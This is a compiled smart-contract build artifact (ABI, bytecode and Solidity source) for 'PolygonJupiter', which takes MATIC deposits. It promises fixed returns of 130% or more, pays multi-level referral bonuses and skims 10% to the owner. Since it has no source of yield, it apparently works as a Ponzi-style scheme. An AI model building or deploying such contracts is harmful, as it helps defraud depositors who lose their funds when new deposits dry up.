{
  "contractName": "PolygonJupiter",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint8",
          "name": "tarif",
          "type": "uint8"
        }
      ],
      "name": "NewDeposit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "RefPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "referral",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "bonus",
          "type": "uint256"
        }
      ],
      "name": "Referral",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Withdraw",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "invested",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "investors",
      "outputs": [
        {
          "internalType": "address",
          "name": "referral",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "dividends",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "referral_bonus",
          "type": "uint256"
        },
        {
          "internalType": "uint40",
          "name": "last_payout",
          "type": "uint40"
        },
        {
          "internalType": "uint256",
          "name": "total_invested",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "total_withdrawn",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "total_referral_bonus",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "ref_bonuses",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "referral_bonus",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "name": "tarifs",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "life_days",
          "type": "uint8"
        },
        {
          "internalType": "uint16",
          "name": "percent",
          "type": "uint16"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "withdrawn",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "contractInfo",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "_invested",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_withdrawn",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_referral_bonus",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfo",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "for_withdraw",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "total_invested",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "total_withdrawn",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "total_referral_bonus",
          "type": "uint256"
        },
        {
          "internalType": "uint256[5]",
          "name": "structure",
          "type": "uint256[5]"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint8",
          "name": "_tarif",
          "type": "uint8"
        },
        {
          "internalType": "address",
          "name": "_referral",
          "type": "address"
        }
      ],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "payoutOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_addr",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_index",
          "type": "uint256"
        }
      ],
      "name": "getDepositDetails",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "_tarif",
          "type": "uint8"
        },
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        },
        {
          "internalType": "uint40",
          "name": "_time",
          "type": "uint40"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506040518060a00160405280605a60ff168152602001602d60ff168152602001601e60ff168152602001600f60ff168152602001600760ff1681525060049060056200009192919062000164565b503480156200009f57600080fd5b506000608290506000600a90505b60228160ff16116200015c5760405180604001604052808260ff1681526020018361ffff16815250600560008360ff1660ff16815260200190815260200160002060008201518160000160006101000a81548160ff021916908360ff16021790555060208201518160000160016101000a81548161ffff021916908361ffff16021790555090505060088262000144919062000224565b9150808062000153906200027e565b915050620000ad565b5050620002dc565b826005601f01602090048101928215620001f25791602002820160005b83821115620001c157835183826101000a81548160ff021916908360ff160217905550926020019260010160208160000104928301926001030262000181565b8015620001f05782816101000a81549060ff0219169055600101602081600001049283019260010302620001c1565b505b50905062000201919062000205565b5090565b5b808211156200022057600081600090555060010162000206565b5090565b6000620002318262000263565b91506200023e8362000263565b92508261ffff03821115620002585762000257620002ad565b5b828201905092915050565b600061ffff82169050919050565b600060ff82169050919050565b60006200028b8262000271565b915060ff821415620002a257620002a1620002ad565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b61208380620002ec6000396000f3fe6080604052600436106100c25760003560e01c80638da5cb5b1161007f578063ab94d95011610059578063ab94d9501461029f578063b7d9f0d2146102bb578063c80ec522146102f8578063cafb220214610323576100c2565b80638da5cb5b1461020b5780639d8dd85e14610236578063a740170914610261576100c2565b806315c43aaf146100c75780631959a002146100f45780633ccfd60b146101355780633d0132e71461014c5780636da61d1e1461018b5780636f7bc9be146101c8575b600080fd5b3480156100d357600080fd5b506100dc61034e565b6040516100eb93929190611bc6565b60405180910390f35b34801561010057600080fd5b5061011b60048036038101906101169190611736565b610367565b60405161012c959493929190611bfd565b60405180910390f35b34801561014157600080fd5b5061014a61052f565b005b34801561015857600080fd5b50610173600480360381019061016e919061175f565b6106ca565b60405161018293929190611cbe565b60405180910390f35b34801561019757600080fd5b506101b260048036038101906101ad9190611736565b610870565b6040516101bf9190611bab565b60405180910390f35b3480156101d457600080fd5b506101ef60048036038101906101ea9190611736565b610ad0565b6040516102029796959493929190611a9c565b60405180910390f35b34801561021757600080fd5b50610220610b43565b60405161022d9190611a81565b60405180910390f35b34801561024257600080fd5b5061024b610b67565b6040516102589190611bab565b60405180910390f35b34801561026d57600080fd5b50610288600480360381019061028391906117ed565b610b6d565b604051610296929190611c95565b60405180910390f35b6102b960048036038101906102b49190611816565b610bac565b005b3480156102c757600080fd5b506102e260048036038101906102dd919061179b565b610eac565b6040516102ef9190611c7a565b60405180910390f35b34801561030457600080fd5b5061030d610ed6565b60405161031a9190611bab565b60405180910390f35b34801561032f57600080fd5b50610338610edc565b6040516103459190611bab565b60405180910390f35b6000806000600154600254600354925092509250909192565b6000806000806103756116c0565b6000600660008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060003073ffffffffffffffffffffffffffffffffffffffff16636da61d1e896040518263ffffffff1660e01b81526004016103f39190611a81565b60206040518083038186803b15801561040b57600080fd5b505afa15801561041f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061044391906117c4565b905060005b60058160ff1610156104ed57826008018160ff1660058110610493577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b0154848260ff16600581106104d1577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200201818152505080806104e590611f80565b915050610448565b5081600201548260010154826105039190611d33565b61050d9190611d33565b8260040154836005015484600601549650965096509650505091939590929450565b6000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905061057b33610ee2565b600081600101541180610592575060008160020154115b6105d1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105c890611b2b565b60405180910390fd5b6000816002015482600101546105e79190611d33565b90506000826001018190555060008260020181905550808260050160008282546106119190611d33565b92505081905550806002600082825461062a9190611d33565b925050819055503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610677573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a9424364826040516106be9190611bab565b60405180910390a25050565b600080600080600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090508060070180549050851061075a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075190611b6b565b60405180910390fd5b806007018581548110610796577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b906000526020600020906003020160000160009054906101000a900460ff168160070186815481106107f1577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b90600052602060002090600302016001015482600701878154811061083f577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b906000526020600020906003020160020160009054906101000a900464ffffffffff16935093509350509250925092565b600080600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060005b8160070180549050811015610ac9576000826007018281548110610904577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b906000526020600020906003020190506000600560008360000160009054906101000a900460ff1660ff1660ff16815260200190815260200160002090506000620151808260000160009054906101000a900460ff1660ff166109679190611df5565b62ffffff168360020160009054906101000a900464ffffffffff1661098c9190611d89565b905060008360020160009054906101000a900464ffffffffff1664ffffffffff168660030160009054906101000a900464ffffffffff1664ffffffffff16116109ea578360020160009054906101000a900464ffffffffff16610a01565b8560030160009054906101000a900464ffffffffff165b905060008264ffffffffff164211610a195742610a1b565b825b90508064ffffffffff168264ffffffffff161015610ab1576283d6008460000160009054906101000a900460ff1660ff168560000160019054906101000a900461ffff1661ffff168484610a6f9190611e8c565b64ffffffffff168860010154610a859190611e32565b610a8f9190611e32565b610a999190611dc4565b610aa39190611dc4565b88610aae9190611d33565b97505b50505050508080610ac190611f37565b9150506108b7565b5050919050565b60066020528060005260406000206000915090508060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16908060010154908060020154908060030160009054906101000a900464ffffffffff16908060040154908060050154908060060154905087565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60035481565b60056020528060005260406000206000915090508060000160009054906101000a900460ff16908060000160019054906101000a900461ffff16905082565b6000600560008460ff1660ff16815260200190815260200160002060000160009054906101000a900460ff1660ff1611610c1b576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c1290611b8b565b60405180910390fd5b670de0b6b3a7640000341015610c66576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c5d90611b4b565b60405180910390fd5b6000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090506064816007018054905010610cf3576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610cea90611b0b565b60405180910390fd5b610cfe338334611039565b8060070160405180606001604052808560ff1681526020013481526020014264ffffffffff16815250908060018154018082558091505060019003906000526020600020906003020160009091909190915060008201518160000160006101000a81548160ff021916908360ff1602179055506020820151816001015560408201518160020160006101000a81548164ffffffffff021916908364ffffffffff160217905550505034816004016000828254610dba9190611d33565b925050819055503460016000828254610dd39190611d33565b92505081905550610de433346113eb565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc600a34610e2b9190611dc4565b9081150290604051600060405180830381858888f19350505050158015610e56573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f0d86f10953d9873a5957019d43d6ec46ac821d7ef9c936a0e65340552e78b79b3485604051610e9f929190611c51565b60405180910390a2505050565b60048160058110610ebc57600080fd5b60209182820401919006915054906101000a900460ff1681565b60025481565b60015481565b60003073ffffffffffffffffffffffffffffffffffffffff16636da61d1e836040518263ffffffff1660e01b8152600401610f1d9190611a81565b60206040518083038186803b158015610f3557600080fd5b505afa158015610f49573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610f6d91906117c4565b905060008111156110355742600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030160006101000a81548164ffffffffff021916908364ffffffffff16021790555080600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600101600082825461102d9190611d33565b925050819055505b5050565b600073ffffffffffffffffffffffffffffffffffffffff16600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16148015611123575060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b156113e6576000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070180549050141561119a5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691505b81600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167faeecfcda1271d292db728294b8ae465871ec039d51404caf49a7eb0ade51770a6064846112779190611dc4565b6040516112849190611bab565b60405180910390a360005b600560ff168160ff1610156113e457600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206008018160ff166005811061131b577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b01600081548092919061132d90611f37565b9190505550600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169250600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614156113d1576113e4565b80806113dc90611f80565b91505061128f565b505b505050565b6000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060005b60058160ff1610156116ba57600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561149b576116ba565b60006103e861ffff1660048360ff16600581106114e1577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602091828204019190069054906101000a900460ff1660ff16856115059190611e32565b61150f9190611dc4565b905080600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160008282546115639190611d33565b9250508190555080600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060160008282546115bc9190611d33565b9250508190555080600360008282546115d59190611d33565b925050819055508473ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fc843fb70235723c89d6a9f7d21874343107d3793f012458d6b93208311492fd6836040516116399190611bab565b60405180910390a3600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1692505080806116b290611f80565b915050611455565b50505050565b6040518060a00160405280600590602082028036833780820191505090505090565b6000813590506116f181612008565b92915050565b6000813590506117068161201f565b92915050565b60008151905061171b8161201f565b92915050565b60008135905061173081612036565b92915050565b60006020828403121561174857600080fd5b6000611756848285016116e2565b91505092915050565b6000806040838503121561177257600080fd5b6000611780858286016116e2565b9250506020611791858286016116f7565b9150509250929050565b6000602082840312156117ad57600080fd5b60006117bb848285016116f7565b91505092915050565b6000602082840312156117d657600080fd5b60006117e48482850161170c565b91505092915050565b6000602082840312156117ff57600080fd5b600061180d84828501611721565b91505092915050565b6000806040838503121561182957600080fd5b600061183785828601611721565b9250506020611848858286016116e2565b9150509250929050565b600061185e8383611a45565b60208301905092915050565b61187381611ec0565b82525050565b61188281611cff565b61188c8184611d17565b925061189782611cf5565b8060005b838110156118c85781516118af8782611852565b96506118ba83611d0a565b92505060018101905061189b565b505050505050565b60006118dd601c83611d22565b91507f4d617820313030206465706f73697473207065722061646472657373000000006000830152602082019050919050565b600061191d600b83611d22565b91507f5a65726f20616d6f756e740000000000000000000000000000000000000000006000830152602082019050919050565b600061195d602183611d22565b91507f4d696e696d756d206465706f73697420616d6f756e742069732031204d41544960008301527f43000000000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b60006119c3601283611d22565b91507f496e646578206f7574206f662072616e676500000000000000000000000000006000830152602082019050919050565b6000611a03600f83611d22565b91507f5461726966206e6f7420666f756e6400000000000000000000000000000000006000830152602082019050919050565b611a3f81611ed2565b82525050565b611a4e81611f0f565b82525050565b611a5d81611f0f565b82525050565b611a6c81611f19565b82525050565b611a7b81611f2a565b82525050565b6000602082019050611a96600083018461186a565b92915050565b600060e082019050611ab1600083018a61186a565b611abe6020830189611a54565b611acb6040830188611a54565b611ad86060830187611a63565b611ae56080830186611a54565b611af260a0830185611a54565b611aff60c0830184611a54565b98975050505050505050565b60006020820190508181036000830152611b24816118d0565b9050919050565b60006020820190508181036000830152611b4481611910565b9050919050565b60006020820190508181036000830152611b6481611950565b9050919050565b60006020820190508181036000830152611b84816119b6565b9050919050565b60006020820190508181036000830152611ba4816119f6565b9050919050565b6000602082019050611bc06000830184611a54565b92915050565b6000606082019050611bdb6000830186611a54565b611be86020830185611a54565b611bf56040830184611a54565b949350505050565b600061012082019050611c136000830188611a54565b611c206020830187611a54565b611c2d6040830186611a54565b611c3a6060830185611a54565b611c476080830184611879565b9695505050505050565b6000604082019050611c666000830185611a54565b611c736020830184611a72565b9392505050565b6000602082019050611c8f6000830184611a72565b92915050565b6000604082019050611caa6000830185611a72565b611cb76020830184611a36565b9392505050565b6000606082019050611cd36000830186611a72565b611ce06020830185611a54565b611ced6040830184611a63565b949350505050565b6000819050919050565b600060059050919050565b6000602082019050919050565b600081905092915050565b600082825260208201905092915050565b6000611d3e82611f0f565b9150611d4983611f0f565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115611d7e57611d7d611faa565b5b828201905092915050565b6000611d9482611f19565b9150611d9f83611f19565b92508264ffffffffff03821115611db957611db8611faa565b5b828201905092915050565b6000611dcf82611f0f565b9150611dda83611f0f565b925082611dea57611de9611fd9565b5b828204905092915050565b6000611e0082611f00565b9150611e0b83611f00565b92508162ffffff0483118215151615611e2757611e26611faa565b5b828202905092915050565b6000611e3d82611f0f565b9150611e4883611f0f565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0483118215151615611e8157611e80611faa565b5b828202905092915050565b6000611e9782611f19565b9150611ea283611f19565b925082821015611eb557611eb4611faa565b5b828203905092915050565b6000611ecb82611ee0565b9050919050565b600061ffff82169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600062ffffff82169050919050565b6000819050919050565b600064ffffffffff82169050919050565b600060ff82169050919050565b6000611f4282611f0f565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff821415611f7557611f74611faa565b5b600182019050919050565b6000611f8b82611f2a565b915060ff821415611f9f57611f9e611faa565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b61201181611ec0565b811461201c57600080fd5b50565b61202881611f0f565b811461203357600080fd5b50565b61203f81611f2a565b811461204a57600080fd5b5056fea26469706673582212200ae5ff783d593d1e8766d48fe7542e7c07185af4bdfcd23c90d7e82094d648a464736f6c63430008000033",
  "immutableReferences": {},
  "source": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nstruct Tarif {\n    uint8 life_days;\n    uint16 percent;\n}\n\nstruct Deposit {\n    uint8 tarif;\n    uint256 amount;\n    uint40 time;\n}\n\nstruct Investor {\n    address referral;\n    uint256 dividends;\n    uint256 referral_bonus;\n    uint40 last_payout;\n    uint256 total_invested;\n    uint256 total_withdrawn;\n    uint256 total_referral_bonus;\n    Deposit[] deposits;\n    uint256[5] structure;\n}\n\ncontract PolygonJupiter {\n    address public owner = msg.sender;\n\n    uint256 public invested;\n    uint256 public withdrawn;\n    uint256 public referral_bonus;\n\n    uint8 constant BONUS_LEVELS_COUNT = 5;\n    uint16 constant PERCENT_DIVIDER = 1000;\n    uint8[BONUS_LEVELS_COUNT] public ref_bonuses = [90, 45, 30, 15, 7];\n\n    mapping(uint8 => Tarif) public tarifs;\n    mapping(address => Investor) public investors;\n\n    event Referral(\n        address indexed addr,\n        address indexed referral,\n        uint256 bonus\n    );\n    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);\n    event RefPayout(address indexed addr, address indexed from, uint256 amount);\n    event Withdraw(address indexed addr, uint256 amount);\n\n    constructor() {\n        uint16 tarifPercent = 130;\n        for (uint8 tarifDays = 10; tarifDays <= 34; tarifDays++) {\n            tarifs[tarifDays] = Tarif(tarifDays, tarifPercent);\n            tarifPercent += 8;\n        }\n    }\n\n    function contractInfo()\n        external\n        view\n        returns (\n            uint256 _invested,\n            uint256 _withdrawn,\n            uint256 _referral_bonus\n        )\n    {\n        return (invested, withdrawn, referral_bonus);\n    }\n\n    function userInfo(address _addr)\n        external\n        view\n        returns (\n            uint256 for_withdraw,\n            uint256 total_invested,\n            uint256 total_withdrawn,\n            uint256 total_referral_bonus,\n            uint256[BONUS_LEVELS_COUNT] memory structure\n        )\n    {\n        Investor storage investor = investors[_addr];\n\n        uint256 payout = this.payoutOf(_addr);\n\n        for (uint8 i = 0; i < ref_bonuses.length; i++) {\n            structure[i] = investor.structure[i];\n        }\n\n        return (\n            payout + investor.dividends + investor.referral_bonus,\n            investor.total_invested,\n            investor.total_withdrawn,\n            investor.total_referral_bonus,\n            structure\n        );\n    }\n\n    function _payout(address _addr) private {\n        uint256 payout = this.payoutOf(_addr);\n\n        if (payout > 0) {\n            investors[_addr].last_payout = uint40(block.timestamp);\n            investors[_addr].dividends += payout;\n        }\n    }\n\n    function _refPayout(address _addr, uint256 _amount) private {\n        address up = investors[_addr].referral;\n\n        for (uint8 i = 0; i < ref_bonuses.length; i++) {\n            if (up == address(0)) break;\n\n            uint256 bonus = (_amount * ref_bonuses[i]) / PERCENT_DIVIDER;\n\n            investors[up].referral_bonus += bonus;\n            investors[up].total_referral_bonus += bonus;\n\n            referral_bonus += bonus;\n\n            emit RefPayout(up, _addr, bonus);\n\n            up = investors[up].referral;\n        }\n    }\n\n    function _setReferral(\n        address _addr,\n        address _referral,\n        uint256 _amount\n    ) private {\n        if (investors[_addr].referral == address(0) && _addr != owner) {\n            if (investors[_referral].deposits.length == 0) {\n                _referral = owner;\n            }\n\n            investors[_addr].referral = _referral;\n\n            emit Referral(_addr, _referral, _amount / 100);\n\n            for (uint8 i = 0; i < BONUS_LEVELS_COUNT; i++) {\n                investors[_referral].structure[i]++;\n\n                _referral = investors[_referral].referral;\n\n                if (_referral == address(0)) break;\n            }\n        }\n    }\n\n    function deposit(uint8 _tarif, address _referral) external payable {\n        require(tarifs[_tarif].life_days > 0, \"Tarif not found\");\n        require(msg.value >= 1 ether, \"Minimum deposit amount is 1 MATIC\");\n\n        Investor storage investor = investors[msg.sender];\n\n        require(investor.deposits.length < 100, \"Max 100 deposits per address\");\n\n        _setReferral(msg.sender, _referral, msg.value);\n\n        investor.deposits.push(\n            Deposit({\n                tarif: _tarif,\n                amount: msg.value,\n                time: uint40(block.timestamp)\n            })\n        );\n\n        investor.total_invested += msg.value;\n        invested += msg.value;\n\n        _refPayout(msg.sender, msg.value);\n\n        payable(owner).transfer(msg.value / 10);\n\n        emit NewDeposit(msg.sender, msg.value, _tarif);\n    }\n\n    function withdraw() external {\n        Investor storage investor = investors[msg.sender];\n\n        _payout(msg.sender);\n\n        require(\n            investor.dividends > 0 || investor.referral_bonus > 0,\n            \"Zero amount\"\n        );\n\n        uint256 amount = investor.dividends + investor.referral_bonus;\n\n        investor.dividends = 0;\n        investor.referral_bonus = 0;\n        investor.total_withdrawn += amount;\n        withdrawn += amount;\n\n        payable(msg.sender).transfer(amount);\n\n        emit Withdraw(msg.sender, amount);\n    }\n\n    function payoutOf(address _addr) external view returns (uint256 value) {\n        Investor storage investor = investors[_addr];\n\n        for (uint256 i = 0; i < investor.deposits.length; i++) {\n            Deposit storage dep = investor.deposits[i];\n            Tarif storage tarif = tarifs[dep.tarif];\n\n            uint40 time_end = dep.time + tarif.life_days * 86400;\n            uint40 from = investor.last_payout > dep.time\n                ? investor.last_payout\n                : dep.time;\n            uint40 to = block.timestamp > time_end\n                ? time_end\n                : uint40(block.timestamp);\n            if (from < to) {\n                value +=\n                    (dep.amount * (to - from) * tarif.percent) /\n                    tarif.life_days /\n                    8640000;\n            }\n        }\n        return value;\n    }\n\n    function getDepositDetails(address _addr, uint256 _index)\n        external\n        view\n        returns (\n            uint8 _tarif,\n            uint256 _amount,\n            uint40 _time\n        )\n    {\n        Investor storage investor = investors[_addr];\n\n        require(_index < investor.deposits.length, \"Index out of range\");\n\n        return (\n            investor.deposits[_index].tarif,\n            investor.deposits[_index].amount,\n            investor.deposits[_index].time\n        );\n    }\n}\n",
  "sourcePath": "/Users/rahulgupta/Workspace/polygon-SC/contracts/PolygonJupiter.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-12-03T15:15:21.184Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}